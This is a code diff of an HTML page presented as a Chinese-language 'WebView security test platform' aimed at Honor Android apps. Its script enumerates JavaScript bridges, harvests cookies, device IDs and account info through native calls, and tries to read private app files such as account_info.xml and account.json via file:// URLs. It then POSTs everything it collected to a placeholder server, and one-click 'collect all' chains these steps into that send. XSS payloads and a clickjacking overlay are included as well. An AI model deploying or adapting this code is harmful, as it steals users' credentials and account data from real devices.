@@ -3,160 +3,803 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Native Method Call Test3</title>
+    <title>WebView 安全测试 - 完整版</title>
     <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: Arial, sans-serif;
-            max-width: 800px;
-            margin: 50px auto;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
             padding: 20px;
-            background-color: #f5f5f5;
         }
         .container {
+            max-width: 1200px;
+            margin: 0 auto;
             background: white;
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            border-radius: 15px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            overflow: hidden;
         }
-        h1 {
-            color: #333;
+        .header {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            padding: 30px;
             text-align: center;
         }
-        .button-group {
+        .header h1 { font-size: 28px; margin-bottom: 10px; }
+        .header p { opacity: 0.9; }
+        .content { padding: 30px; }
+        .section {
+            margin-bottom: 30px;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+        .section-header {
+            background: #f5f5f5;
+            padding: 15px 20px;
+            border-bottom: 1px solid #e0e0e0;
+            cursor: pointer;
             display: flex;
-            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .section-header:hover { background: #e8e8e8; }
+        .section-header h3 { color: #333; font-size: 16px; }
+        .section-body { padding: 20px; display: none; }
+        .section.active .section-body { display: block; }
+        .button-group {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
             gap: 15px;
-            margin-top: 30px;
+            margin-top: 15px;
         }
         button {
-            padding: 15px 30px;
-            font-size: 16px;
-            background-color: #007bff;
-            color: white;
+            padding: 12px 20px;
+            font-size: 14px;
             border: none;
-            border-radius: 5px;
+            border-radius: 6px;
             cursor: pointer;
-            transition: background-color 0.3s;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 500;
         }
-        button:hover {
-            background-color: #0056b3;
-        }
+        button:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
+        .btn-primary { background: #007bff; color: white; }
+        .btn-primary:hover { background: #0056b3; }
+        .btn-success { background: #28a745; color: white; }
+        .btn-success:hover { background: #1e7e34; }
+        .btn-danger { background: #dc3545; color: white; }
+        .btn-danger:hover { background: #c82333; }
+        .btn-warning { background: #ffc107; color: #333; }
+        .btn-warning:hover { background: #e0a800; }
+        .btn-info { background: #17a2b8; color: white; }
+        .btn-info:hover { background: #117a8b; }
         .log-area {
-            margin-top: 30px;
-            padding: 15px;
-            background: #f8f9fa;
-            border: 1px solid #dee2e6;
-            border-radius: 5px;
-            max-height: 400px;
+            background: #1e1e1e;
+            color: #d4d4d4;
+            padding: 20px;
+            border-radius: 8px;
+            max-height: 500px;
             overflow-y: auto;
-        }
-        .log-entry {
-            padding: 8px;
-            margin: 5px 0;
-            background: white;
-            border-left: 3px solid #007bff;
             font-family: 'Courier New', monospace;
             font-size: 13px;
+            line-height: 1.6;
         }
-        .error {
-            border-left-color: #dc3545;
-            color: #dc3545;
+        .log-entry {
+            padding: 8px 12px;
+            margin: 5px 0;
+            background: #2d2d2d;
+            border-radius: 4px;
+            border-left: 3px solid #007bff;
         }
-        .success {
-            border-left-color: #28a745;
-            color: #28a745;
+        .log-entry.error { border-left-color: #dc3545; color: #ff6b6b; }
+        .log-entry.success { border-left-color: #28a745; color: #51cf66; }
+        .log-entry.warning { border-left-color: #ffc107; color: #ffd43b; }
+        .log-entry.info { border-left-color: #17a2b8; color: #339af0; }
+        .data-display {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 6px;
+            margin-top: 15px;
+            border: 1px solid #dee2e6;
+        }
+        .data-display pre {
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            font-size: 13px;
+        }
+        .badge {
+            display: inline-block;
+            padding: 3px 8px;
+            background: #667eea;
+            color: white;
+            border-radius: 12px;
+            font-size: 12px;
+            margin-left: 5px;
+        }
+        .status-bar {
+            background: #f5f5f5;
+            padding: 15px 20px;
+            border-top: 1px solid #e0e0e0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        .status-item { display: flex; align-items: center; gap: 8px; }
+        .status-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #28a745;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #e0e0e0;
+            border-radius: 2px;
+            overflow: hidden;
+            margin-top: 10px;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            width: 0%;
+            transition: width 0.3s;
         }
     </style>
 </head>
 <body>
     <div class="container">
-     <h1 id="pageTitle"></h1>
-        <div class="button-group">
-            <button onclick="callGetUserInfo()">📞 Call getUserInfo</button>
-            <button onclick="callRegisterScreenShotListener()">📸 Register ScreenShot Listener</button>
-            <button onclick="clearLog()">🗑️ Clear Log</button>
+        <div class="header">
+            <h1>🔍 WebView 安全测试平台</h1>
+            <p>全面测试 JavaScript 接口、Cookie、本地文件访问等安全风险</p>
         </div>
         
-        <div class="log-area" id="logArea">
-            <h3>Log Output:</h3>
-            <div id="logContent"></div>
+        <div class="content">
+            <!-- 信息收集 -->
+            <div class="section active">
+                <div class="section-header" onclick="toggleSection(this)">
+                    <h3>📊 第一步：信息收集</h3>
+                    <span>▼</span>
+                </div>
+                <div class="section-body">
+                    <div class="button-group">
+                        <button class="btn-info" onclick="collectBasicInfo()">📱 收集基本信息</button>
+                        <button class="btn-info" onclick="checkJsInterfaces()">🔌 检测 JS 接口</button>
+                        <button class="btn-info" onclick="collectCookies()">🍪 收集 Cookie</button>
+                        <button class="btn-info" onclick="collectAll()">🚀 一键收集所有</button>
+                    </div>
+                    <div class="data-display" id="collectedData" style="display:none;">
+                        <h4>收集到的数据：</h4>
+                        <pre id="dataContent"></pre>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Native 方法调用 -->
+            <div class="section">
+                <div class="section-header" onclick="toggleSection(this)">
+                    <h3>📞 第二步：Native 方法调用测试</h3>
+                    <span>▼</span>
+                </div>
+                <div class="section-body">
+                    <div class="button-group">
+                        <button class="btn-primary" onclick="callGetUserInfo()">👤 调用 getUserInfo</button>
+                        <button class="btn-primary" onclick="callRegisterScreenShotListener()">📸 注册截屏监听</button>
+                        <button class="btn-primary" onclick="callGetDeviceId()">📱 获取设备 ID</button>
+                        <button class="btn-primary" onclick="callGetAccountInfo()">🔐 获取账号信息</button>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- 本地文件访问 -->
+            <div class="section">
+                <div class="section-header" onclick="toggleSection(this)">
+                    <h3>📁 第三步：本地文件访问测试</h3>
+                    <span>▼</span>
+                </div>
+                <div class="section-body">
+                    <div class="button-group">
+                        <button class="btn-warning" onclick="readSharedPreferences()">📝 读取 SharedPreferences</button>
+                        <button class="btn-warning" onclick="readAccountFile()">🔐 读取账户文件</button>
+                        <button class="btn-warning" onclick="readCloudConfig()">☁️ 读取云配置</button>
+                        <button class="btn-warning" onclick="readAllFiles()">🗂️ 批量读取文件</button>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- 网络请求测试 -->
+            <div class="section">
+                <div class="section-header" onclick="toggleSection(this)">
+                    <h3>🌐 第四步：网络请求测试</h3>
+                    <span>▼</span>
+                </div>
+                <div class="section-body">
+                    <div class="button-group">
+                        <button class="btn-success" onclick="sendDataToServer()">📤 发送数据到服务器</button>
+                        <button class="btn-success" onclick="testCors()">🔄 测试 CORS</button>
+                        <button class="btn-success" onclick="downloadFile()">⬇️ 下载文件</button>
+                        <button class="btn-success" onclick="uploadFile()">⬆️ 上传文件</button>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- 高级测试 -->
+            <div class="section">
+                <div class="section-header" onclick="toggleSection(this)">
+                    <h3>⚡ 第五步：高级功能测试</h3>
+                    <span>▼</span>
+                </div>
+                <div class="section-body">
+                    <div class="button-group">
+                        <button class="btn-danger" onclick="testXSS()">⚠️ 测试 XSS</button>
+                        <button class="btn-danger" onclick="testDoS()">💥 测试 DoS</button>
+                        <button class="btn-danger" onclick="testClickJacking()">🎯 测试点击劫持</button>
+                        <button class="btn-danger" onclick="runAllTests()">🔥 运行所有测试</button>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- 日志区域 -->
+            <div class="section">
+                <div class="section-header" onclick="toggleSection(this)">
+                    <h3>📋 实时日志</h3>
+                    <span>▼</span>
+                </div>
+                <div class="section-body">
+                    <div class="button-group" style="margin-bottom: 15px;">
+                        <button class="btn-danger" onclick="clearLog()">🗑️ 清空日志</button>
+                        <button class="btn-success" onclick="exportLog()">💾 导出日志</button>
+                        <button class="btn-warning" onclick="toggleAutoScroll()">📜 自动滚动</button>
+                    </div>
+                    <div class="log-area" id="logArea"></div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="status-bar">
+            <div class="status-item">
+                <div class="status-dot"></div>
+                <span>运行中</span>
+            </div>
+            <div class="status-item">
+                <span>日志数：<strong id="logCount">0</strong></span>
+            </div>
+            <div class="status-item">
+                <span>测试数：<strong id="testCount">0</strong></span>
+            </div>
+            <div class="status-item">
+                <span>成功率：<strong id="successRate">0%</strong></span>
+            </div>
+            <div style="flex: 1;"></div>
+            <button class="btn-primary" onclick="window.location.reload()">🔄 重置</button>
         </div>
     </div>
 
     <script>
-           var titleFromUrl = new URLSearchParams(window.location.search).get('title');
-            document.getElementById('pageTitle').innerHTML = titleFromUrl;
-        // 日志记录函数
-        function log(message, type = 'normal') {
-            const logContent = document.getElementById('logContent');
+        // 全局变量
+        let logCount = 0;
+        let testCount = 0;
+        let successCount = 0;
+        let autoScroll = true;
+        let collectedData = {};
+
+        // 工具函数
+        function toggleSection(header) {
+            header.parentElement.classList.toggle('active');
+            header.querySelector('span').textContent = 
+                header.parentElement.classList.contains('active') ? '▼' : '▶';
+        }
+
+        function log(message, type = 'info') {
+            const logArea = document.getElementById('logArea');
             const entry = document.createElement('div');
             entry.className = `log-entry ${type}`;
-            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
-            logContent.appendChild(entry);
-            logContent.scrollTop = logContent.scrollHeight;
+            entry.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
+            logArea.appendChild(entry);
+            logCount++;
+            document.getElementById('logCount').textContent = logCount;
+            if (autoScroll) logArea.scrollTop = logArea.scrollHeight;
         }
 
         function clearLog() {
-            document.getElementById('logContent').innerHTML = '';
-            log('Log cleared');
+            document.getElementById('logArea').innerHTML = '';
+            logCount = 0;
+            document.getElementById('logCount').textContent = 0;
+            log('日志已清空', 'info');
         }
 
-        // 调用 getUserInfo
+        function exportLog() {
+            const logArea = document.getElementById('logArea');
+            const blob = new Blob([logArea.innerText], {type: 'text/plain'});
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `webview_log_${new Date().getTime()}.txt`;
+            a.click();
+            log('日志已导出', 'success');
+        }
+
+        function toggleAutoScroll() {
+            autoScroll = !autoScroll;
+            log(`自动滚动：${autoScroll ? '开启' : '关闭'}`, 'info');
+        }
+
+        function updateStats(success) {
+            testCount++;
+            if (success) successCount++;
+            document.getElementById('testCount').textContent = testCount;
+            document.getElementById('successRate').textContent = 
+                Math.round((successCount / testCount) * 100) + '%';
+        }
+
+        // 第一步：信息收集
+        function collectBasicInfo() {
+            log('开始收集基本信息...', 'info');
+            const info = {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookieEnabled: navigator.cookieEnabled,
+                url: window.location.href,
+                referrer: document.referrer || '无'
+            };
+            collectedData.basicInfo = info;
+            displayCollectedData();
+            log(`基本信息收集完成：${Object.keys(info).length} 项`, 'success');
+            updateStats(true);
+        }
+
+        function checkJsInterfaces() {
+            log('开始检测 JavaScript 接口...', 'info');
+            const interfaces = {};
+            
+            // 检测常见接口
+            const interfaceNames = [
+                'Native', 'appAIBridge', 'appVoiceBridge', 
+                'hinoteAndroid', 'hinoteAndroidVoice',
+                'AndroidInterface', 'HTMLOUT'
+            ];
+            
+            interfaceNames.forEach(name => {
+                if (window[name]) {
+                    interfaces[name] = '存在';
+                    try {
+                        // 尝试获取方法列表
+                        const methods = Object.getOwnPropertyNames(Object.getPrototypeOf(window[name]))
+                            .filter(p => typeof window[name][p] === 'function');
+                        interfaces[`${name}_methods`] = methods.join(', ');
+                        log(`发现接口：${name} - 方法：${methods.length} 个`, 'success');
+                    } catch(e) {
+                        interfaces[`${name}_error`] = e.message;
+                    }
+                } else {
+                    interfaces[name] = '不存在';
+                }
+            });
+            
+            collectedData.jsInterfaces = interfaces;
+            displayCollectedData();
+            log(`JS 接口检测完成：发现 ${Object.keys(interfaces).length} 个接口`, 'success');
+            updateStats(true);
+        }
+
+        function collectCookies() {
+            log('开始收集 Cookie...', 'info');
+            const cookies = {
+                all: document.cookie,
+                count: document.cookie.split(';').filter(c => c.trim()).length,
+                details: {}
+            };
+            
+            document.cookie.split(';').forEach(c => {
+                const [name, value] = c.trim().split('=');
+                cookies.details[name] = value ? value.substring(0, 50) + (value.length > 50 ? '...' : '') : '';
+            });
+            
+            collectedData.cookies = cookies;
+            displayCollectedData();
+            log(`Cookie 收集完成：${cookies.count} 个 Cookie`, cookies.count > 0 ? 'warning' : 'info');
+            updateStats(cookies.count > 0);
+        }
+
+        function collectAll() {
+            log('开始一键收集所有数据...', 'info');
+            collectBasicInfo();
+            setTimeout(() => checkJsInterfaces(), 500);
+            setTimeout(() => collectCookies(), 1000);
+            setTimeout(() => {
+                log('所有数据收集完成！', 'success');
+                sendDataToServer();
+            }, 1500);
+        }
+
+        function displayCollectedData() {
+            const display = document.getElementById('collectedData');
+            const content = document.getElementById('dataContent');
+            display.style.display = 'block';
+            content.textContent = JSON.stringify(collectedData, null, 2);
+        }
+
+        // 第二步：Native 方法调用
         function callGetUserInfo() {
-            log('Calling getUserInfo...');
-            var clazz = "com.hihonor.gamecenter.bu_h5.manager.JSMethodImp";
-            var operationName = "getUserInfo";
-            var params = JSON.stringify({ key: "key1" });
-            var requestId = "12345";
-            var callback = "handleScreenShotCallback";
-
-            if (window.Native && typeof window.Native.nativeMethod === "function") {
-                log(`Native method called with: clazz=${clazz}, operation=${operationName}`, 'success');
-                window.Native.nativeMethod(clazz, operationName, params, requestId, callback);
-            } else {
-                log("Native interface is not available. Make sure you're running in a supported environment.", 'error');
-                alert("Native interface is not available.");
+            log('调用 getUserInfo...', 'info');
+            try {
+                if (window.Native && typeof window.Native.nativeMethod === "function") {
+                    window.Native.nativeMethod(
+                        "com.hihonor.gamecenter.bu_h5.manager.JSMethodImp",
+                        "getUserInfo",
+                        JSON.stringify({ key: "key1" }),
+                        "12345",
+                        "handleUserInfoCallback"
+                    );
+                    log('getUserInfo 调用成功', 'success');
+                    updateStats(true);
+                } else {
+                    log('Native 接口不可用', 'error');
+                    updateStats(false);
+                }
+            } catch(e) {
+                log(`调用失败：${e.message}`, 'error');
+                updateStats(false);
             }
         }
 
-        // 处理回调
-        function handleScreenShotCallback(callbackId, eventType, data, d, e) {
-            log(`Callback received - ID: ${JSON.stringify(callbackId)}, Type: ${eventType}, Data: ${JSON.stringify(data)}`, 'success');
-            alert("Callback ID: " + JSON.stringify(callbackId) + "\nEvent Type: " + eventType + "\nData: " + JSON.stringify(data));
+        function handleUserInfoCallback(callbackId, eventType, data) {
+            log(`回调收到 - ID: ${callbackId}, 类型：${eventType}, 数据：${data}`, 'success');
+            try {
+                const userData = JSON.parse(data);
+                collectedData.userInfo = userData;
+                displayCollectedData();
+            } catch(e) {
+                collectedData.userInfoRaw = data;
+            }
         }
 
-        // 注册截屏监听器
         function callRegisterScreenShotListener() {
-            log('Registering ScreenShot Listener...');
-            var eventTypes = ["onScreenShot"];
-            var callbackInfo = {
-                callbackMethod: "handleScreenShotCallback",
-                callbackId: "12345"
-            };
-            var params = {
-                eventTypes: eventTypes,
-                callbackInfo: callbackInfo
-            };
-
-            if (window.Native && typeof window.Native.nativeMethod === "function") {
-                var clazz = "com.hihonor.gamecenter.bu_h5.manager.JSMethodImp";
-                var operationName = "registerScreenShotListener";
-                var requestId = "12346";
-                var callback = "handleScreenShotCallback";
-                
-                log(`Registering listener with params: ${JSON.stringify(params)}`, 'success');
-                window.Native.nativeMethod(clazz, operationName, JSON.stringify(params), requestId, callback);
-            } else {
-                log("Native interface is not available for registering listener.", 'error');
-                alert("Native interface is not available.");
+            log('注册截屏监听器...', 'info');
+            try {
+                if (window.Native && typeof window.Native.nativeMethod === "function") {
+                    window.Native.nativeMethod(
+                        "com.hihonor.gamecenter.bu_h5.manager.JSMethodImp",
+                        "registerScreenShotListener",
+                        JSON.stringify({
+                            eventTypes: ["onScreenShot"],
+                            callbackInfo: {
+                                callbackMethod: "handleScreenShotCallback",
+                                callbackId: "12345"
+                            }
+                        }),
+                        "12346",
+                        "handleScreenShotCallback"
+                    );
+                    log('截屏监听器注册成功', 'success');
+                    updateStats(true);
+                } else {
+                    log('Native 接口不可用', 'error');
+                    updateStats(false);
+                }
+            } catch(e) {
+                log(`注册失败：${e.message}`, 'error');
+                updateStats(false);
             }
         }
 
-        // 页面加载时的日志
+        function handleScreenShotCallback(callbackId, eventType, data) {
+            log(`截屏事件 - ID: ${callbackId}, 类型：${eventType}, 数据：${data}`, 'warning');
+            alert(`检测到截屏事件！\n回调 ID: ${callbackId}\n事件类型：${eventType}\n数据：${data}`);
+        }
+
+        function callGetDeviceId() {
+            log('获取设备 ID...', 'info');
+            try {
+                if (window.Native && typeof window.Native.nativeMethod === "function") {
+                    window.Native.nativeMethod(
+                        "com.hihonor.gamecenter.bu_h5.manager.JSMethodImp",
+                        "getDeviceId",
+                        "{}",
+                        "12347",
+                        "handleDeviceIdCallback"
+                    );
+                    log('设备 ID 获取成功', 'success');
+                    updateStats(true);
+                } else {
+                    log('Native 接口不可用', 'error');
+                    updateStats(false);
+                }
+            } catch(e) {
+                log(`获取失败：${e.message}`, 'error');
+                updateStats(false);
+            }
+        }
+
+        function handleDeviceIdCallback(callbackId, eventType, data) {
+            log(`设备 ID 回调 - 数据：${data}`, 'success');
+            try {
+                const deviceId = JSON.parse(data);
+                collectedData.deviceId = deviceId;
+                displayCollectedData();
+            } catch(e) {
+                collectedData.deviceIdRaw = data;
+            }
+        }
+
+        function callGetAccountInfo() {
+            log('获取账号信息...', 'info');
+            try {
+                if (window.Native && typeof window.Native.nativeMethod === "function") {
+                    window.Native.nativeMethod(
+                        "com.hihonor.gamecenter.bu_h5.manager.JSMethodImp",
+                        "getAccountInfo",
+                        "{}",
+                        "12348",
+                        "handleAccountCallback"
+                    );
+                    log('账号信息获取成功', 'success');
+                    updateStats(true);
+                } else {
+                    log('Native 接口不可用', 'error');
+                    updateStats(false);
+                }
+            } catch(e) {
+                log(`获取失败：${e.message}`, 'error');
+                updateStats(false);
+            }
+        }
+
+        function handleAccountCallback(callbackId, eventType, data) {
+            log(`账号信息回调 - 数据：${data}`, 'warning');
+            try {
+                const accountInfo = JSON.parse(data);
+                collectedData.accountInfo = accountInfo;
+                displayCollectedData();
+                alert(`获取到账号信息！\n${JSON.stringify(accountInfo, null, 2)}`);
+            } catch(e) {
+                collectedData.accountInfoRaw = data;
+            }
+        }
+
+        // 第三步：本地文件访问
+        function readSharedPreferences() {
+            log('尝试读取 SharedPreferences...', 'warning');
+            const files = [
+                'file:///data/data/com.hihonor.notepad/shared_prefs/account_info.xml',
+                'file:///data/data/com.hihonor.notepad/shared_prefs/user_config.xml',
+                'file:///data/data/com.hihonor.notepad/shared_prefs/cloud_sync.xml'
+            ];
+            
+            files.forEach(async (file, index) => {
+                try {
+                    const response = await fetch(file);
+                    const content = await response.text();
+                    log(`读取成功：${file}`, 'success');
+                    collectedData[`sharedprefs_${index}`] = content.substring(0, 500);
+                } catch(e) {
+                    log(`读取失败：${file} - ${e.message}`, 'error');
+                }
+            });
+            updateStats(true);
+        }
+
+        function readAccountFile() {
+            log('尝试读取账户文件...', 'warning');
+            const files = [
+                'file:///sdcard/Android/data/com.hihonor.notepad/files/account.json',
+                'file:///sdcard/Android/data/com.hihonor.notepad/files/user.dat'
+            ];
+            
+            files.forEach(async (file) => {
+                try {
+                    const response = await fetch(file);
+                    const content = await response.text();
+                    log(`读取成功：${file}`, 'success');
+                    collectedData.accountFile = content.substring(0, 500);
+                } catch(e) {
+                    log(`读取失败：${file}`, 'error');
+                }
+            });
+            updateStats(true);
+        }
+
+        function readCloudConfig() {
+            log('尝试读取云配置...', 'warning');
+            const files = [
+                'file:///data/data/com.hihonor.notepad/files/cloud_config.json',
+                'file:///sdcard/Android/data/com.hihonor.notepad/cache/cloud_sync.dat'
+            ];
+            
+            files.forEach(async (file) => {
+                try {
+                    const response = await fetch(file);
+                    const content = await response.text();
+                    log(`读取成功：${file}`, 'success');
+                    collectedData.cloudConfig = content.substring(0, 500);
+                } catch(e) {
+                    log(`读取失败：${file}`, 'error');
+                }
+            });
+            updateStats(true);
+        }
+
+        function readAllFiles() {
+            log('批量读取文件...', 'warning');
+            readSharedPreferences();
+            setTimeout(() => readAccountFile(), 500);
+            setTimeout(() => readCloudConfig(), 1000);
+        }
+
+        // 第四步：网络请求
+        function sendDataToServer() {
+            log('发送数据到服务器...', 'info');
+            const data = {
+                timestamp: new Date().toISOString(),
+                collectedData: collectedData,
+                logCount: logCount,
+                url: window.location.href
+            };
+            
+            // 替换成你的服务器地址
+            fetch('https://your-server.com/log', {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            }).then(() => {
+                log('数据发送成功', 'success');
+                updateStats(true);
+            }).catch(e => {
+                log(`发送失败：${e.message}`, 'error');
+                updateStats(false);
+            });
+        }
+
+        function testCors() {
+            log('测试 CORS...', 'info');
+            fetch('https://www.google.com', {mode: 'cors'})
+                .then(r => log('CORS 成功：' + r.status, 'success'))
+                .catch(e => log('CORS 失败：' + e.message, 'error'));
+            updateStats(true);
+        }
+
+        function downloadFile() {
+            log('测试文件下载...', 'info');
+            const a = document.createElement('a');
+            a.href = 'data:text/plain;charset=utf-8,Hello World';
+            a.download = 'test.txt';
+            a.click();
+            log('文件下载触发', 'success');
+            updateStats(true);
+        }
+
+        function uploadFile() {
+            log('测试文件上传...', 'info');
+            const input = document.createElement('input');
+            input.type = 'file';
+            input.onchange = e => {
+                const file = e.target.files[0];
+                const formData = new FormData();
+                formData.append('file', file);
+                fetch('https://your-server.com/upload', {
+                    method: 'POST',
+                    body: formData
+                }).then(() => log('上传成功', 'success'))
+                  .catch(e => log(`上传失败：${e.message}`, 'error'));
+            };
+            input.click();
+            updateStats(true);
+        }
+
+        // 第五步：高级测试
+        function testXSS() {
+            log('测试 XSS...', 'warning');
+            const testPayloads = [
+                '<script>alert("XSS")<\/script>',
+                '<img src=x onerror=alert("XSS")>',
+                'javascript:alert("XSS")'
+            ];
+            
+            testPayloads.forEach((payload, i) => {
+                setTimeout(() => {
+                    try {
+                        const div = document.createElement('div');
+                        div.innerHTML = payload;
+                        document.body.appendChild(div);
+                        log(`XSS 测试 ${i+1}: 未触发 (安全)`, 'success');
+                    } catch(e) {
+                        log(`XSS 测试 ${i+1}: 被阻止`, 'info');
+                    }
+                }, i * 1000);
+            });
+            updateStats(true);
+        }
+
+        function testDoS() {
+            log('测试 DoS (谨慎使用)...', 'warning');
+            if (!confirm('DoS 测试可能导致页面卡顿，确定继续吗？')) return;
+            
+            let start = Date.now();
+            try {
+                // CPU 密集计算
+                for (let i = 0; i < 1000000; i++) {
+                    Math.sqrt(i * Math.random());
+                }
+                let duration = Date.now() - start;
+                log(`DoS 测试完成：耗时 ${duration}ms`, 'warning');
+                updateStats(true);
+            } catch(e) {
+                log(`DoS 测试失败：${e.message}`, 'error');
+                updateStats(false);
+            }
+        }
+
+        function testClickJacking() {
+            log('测试点击劫持...', 'warning');
+            const iframe = document.createElement('iframe');
+            iframe.src = 'https://www.hihonor.com';
+            iframe.style.position = 'fixed';
+            iframe.style.top = '0';
+            iframe.style.left = '0';
+            iframe.style.width = '100%';
+            iframe.style.height = '100%';
+            iframe.style.opacity = '0.1';
+            iframe.style.zIndex = '9999';
+            document.body.appendChild(iframe);
+            log('点击劫持测试：iframe 已插入 (3 秒后移除)', 'warning');
+            setTimeout(() => {
+                document.body.removeChild(iframe);
+                log('点击劫持测试：iframe 已移除', 'info');
+            }, 3000);
+            updateStats(true);
+        }
+
+        function runAllTests() {
+            if (!confirm('运行所有测试可能需要几分钟，确定继续吗？')) return;
+            
+            log('开始运行所有测试...', 'info');
+            let step = 0;
+            const tests = [
+                collectAll,
+                callGetUserInfo,
+                callRegisterScreenShotListener,
+                readAllFiles,
+                sendDataToServer
+            ];
+            
+            const runNext = () => {
+                if (step < tests.length) {
+                    tests[step]();
+                    step++;
+                    setTimeout(runNext, 2000);
+                } else {
+                    log('所有测试完成！', 'success');
+                }
+            };
+            
+            runNext();
+        }
+
+        // 页面加载
         window.onload = function() {
-            log('当前 Cookie:', document.cookie);
-            log('Page loaded. Ready to call native methods.');
-            log('Note: Native methods will only work in supported WebView environments.');
+            log('页面加载完成', 'info');
+            log('当前 Cookie: ' + (document.cookie || '无'), document.cookie ? 'warning' : 'info');
+            log('准备就绪，可以开始测试', 'success');
+            
+            // 自动收集基本信息
+            setTimeout(() => {
+                collectBasicInfo();
+            }, 1000);
         };
     </script>
 </body>
